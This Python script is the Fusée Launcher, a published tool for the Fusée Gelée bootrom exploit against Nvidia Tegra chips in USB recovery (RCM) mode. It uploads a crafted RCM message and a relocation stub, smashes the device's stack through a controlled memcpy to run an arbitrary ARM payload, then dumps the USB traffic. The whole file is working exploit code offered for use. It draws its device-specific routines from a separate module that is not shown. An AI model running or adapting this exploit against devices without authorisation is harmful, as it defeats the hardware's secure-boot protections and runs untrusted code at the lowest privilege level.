#!/usr/bin/env python3
#
# fusée gelée
#
# Launcher for the {re}switched coldboot/bootrom hacks--
# launches payloads above the Horizon
#
# discovery and implementation by @ktemkin
# likely independently discovered by lots of others <3
#
# this code is political -- it stands with those who fight for LGBT rights
# don't like it? suck it up, or find your own damned exploit ^-^
#
# special thanks to:
#    ScirèsM, motezazer -- guidance and support
#    hedgeberg, andeor  -- dumping the Jetson bootROM
#    TuxSH              -- for IDB notes that were nice to peek at
#
# much love to:
#    Aurora Wright, Qyriad, f916253, MassExplosion213, and Levi
#
# greetings to:
#    shuffle2

# This file is part of Fusée Launcher
# Copyright (C) 2018 Mikaela Szekely <qyriad@gmail.com>
# Copyright (C) 2018 Kate Temkin <k@ktemkin.com>
# Fusée Launcher is licensed under the terms of the GNU GPLv2

import os
import sys
import errno
import ctypes
import argparse
import platform
import usb

from SoC import *


def parse_usb_id(id):
    """ Quick function to parse VID/PID arguments. """
    return int(id, 16)

# Read our arguments.
parser = argparse.ArgumentParser(description='launcher for the fusee gelee exploit (by @ktemkin)')
parser.add_argument('payload', metavar='payload', type=str, help='ARM payload to be launched')
parser.add_argument('-w', dest='wait', action='store_true', help='wait for an RCM connection if one isn\'t present')
parser.add_argument('-V', metavar='vendor_id', dest='vid', type=parse_usb_id, default=None, help='overrides the TegraRCM vendor ID')
parser.add_argument('-P', metavar='product_id', dest='pid', type=parse_usb_id, default=None, help='overrides the TegraRCM product ID')
parser.add_argument('--override-os', metavar='platform', dest='platform', type=str, default=None, help='overrides the detected OS; for advanced users only')
parser.add_argument('--relocator', metavar='binary', dest='relocator', type=str, default="%s/intermezzo.bin" % os.path.dirname(os.path.abspath(__file__)), help='provides the path to the intermezzo relocation stub')
parser.add_argument('--override-checks', dest='skip_checks', action='store_true', help="don't check for a supported controller; useful if you've patched your EHCI driver")
parser.add_argument('--allow-failed-id', dest='permissive_id', action='store_true', help="continue even if reading the device's ID fails; useful for development but not for end users")
parser.add_argument('--tty', dest='tty_mode', action='store_true', help="dump usb transfers to stdout")
parser.add_argument('-o', metavar='output_file', dest='output_file', type=str, help='dump usb transfers to file')
parser.add_argument('--debug', dest='debug', action='store_true', help="enable additional debug output")

arguments = parser.parse_args()

# Expand out the payload path to handle any user-refrences.
payload_path = os.path.expanduser(arguments.payload)
if not os.path.isfile(payload_path):
    print("Invalid payload path specified!")
    sys.exit(-1)

# Find our intermezzo relocator...
intermezzo_path = os.path.expanduser(arguments.relocator)
if not os.path.isfile(intermezzo_path):
    print("Could not find the intermezzo interposer. Did you build it?")
    sys.exit(-1)

# Automatically choose the correct SoC based on the USB product ID.
rcm_device = detect_device(wait_for_device=arguments.wait, os_override=arguments.platform, vid=arguments.vid, pid=arguments.pid, override_checks=arguments.skip_checks, debug=arguments.debug)
if rcm_device is None:
    print("No RCM device found")
    sys.exit(-1)
else:
    print("Detected a" , type(rcm_device).__name__, "SoC")
    print('VendorID=' + hex(rcm_device.dev.idVendor) + ' & ProductID=' + hex(rcm_device.dev.idProduct))

# Print the device's ID. Note that reading the device's ID is necessary to get it into RCM.
try:
    device_id = rcm_device.read_device_id()
    print("Found a Tegra with Device ID: {}".format(device_id.hex()))
except OSError as e:
    # Raise the exception only if we're not being permissive about ID reads.
    if not arguments.permissive_id:
        raise e

# Construct the RCM message which contains the data needed for the exploit.
rcm_message = rcm_device.create_rcm_message(intermezzo_path, payload_path)

# Send the constructed payload, which contains the command, the stack smashing
# values, the Intermezzo relocation stub, and the final payload.
print("Uploading payload...")
rcm_device.write(rcm_message)

# The RCM backend alternates between two different DMA buffers. Ensure we're
# about to DMA into the higher one, so we have less to copy during our attack.
rcm_device.switch_to_highbuf()

# Smash the device's stack, triggering the vulnerability.
print("Smashing the stack...")
try:
    rcm_device.trigger_controlled_memcpy()
except ValueError as e:
    print(str(e))
except IOError:
    print("The USB device stopped responding-- sure smells like we've smashed its stack. :)")
    print("Launch complete!")

if arguments.tty_mode or arguments.output_file:
    if arguments.output_file:
        output_file = os.path.expanduser(arguments.output_file)
        dump = open(output_file, "wb")

    print("Listening to incoming USB Data:")
    print("-------------------------------")
    while True:
        try:
            buf = rcm_device.read(0x1000)

            if arguments.output_file:
                dump.write(buf)
                print("wrote", len(buf), "bytes to file")

            if arguments.tty_mode:
                print("HEX: (",len(buf), "/", hex(len(buf)),")")
                print(buf.hex())

                try:
                    string = buf.decode('utf-8')
                    print("\nUTF-8:")
                    print(string)
                except UnicodeDecodeError:
                    pass
                finally:
                    print("+++++++++++++++++++++++++++++++")

        except:
            print("-------------------------------")
            print("End of Transmission")
            break

    if arguments.output_file:
        dump.close()
        print("Closed file")
